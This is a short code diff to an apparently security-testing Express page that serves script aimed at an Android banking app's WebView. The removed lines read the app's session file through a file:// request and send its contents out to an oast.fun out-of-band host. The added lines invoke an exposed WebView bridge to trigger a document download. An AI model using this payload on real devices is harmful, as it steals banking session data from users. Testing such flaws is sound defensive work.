@@ -14,13 +14,11 @@ app.get("/", (_req, res) => {
 <head><title>Loading...</title></head>
 <body>
 <script>
-var xhr = new XMLHttpRequest();
-xhr.open('GET', 'file:///data/data/com.rbc.mobile.android/shared_prefs/UserSessionInformation.xml', true);
-xhr.onload = function() {
-    // Exfiltrate session data
-    new Image().src = 'https://edzgaslqbiamjmvftfea7klu2g2d78cp3.oast.fun/exfil?data=' + encodeURIComponent(xhr.responseText);
-};
-xhr.send();
+WebViewFragment.onFeatureEventWebHook(JSON.stringify({
+    "version": "1.2",
+    "type": "DOWNLOAD_DOCUMENT",
+    "targetUrl": "https://appsec-test-website/test.txt"
+}));
 </script>
 </body>
 </html>`);
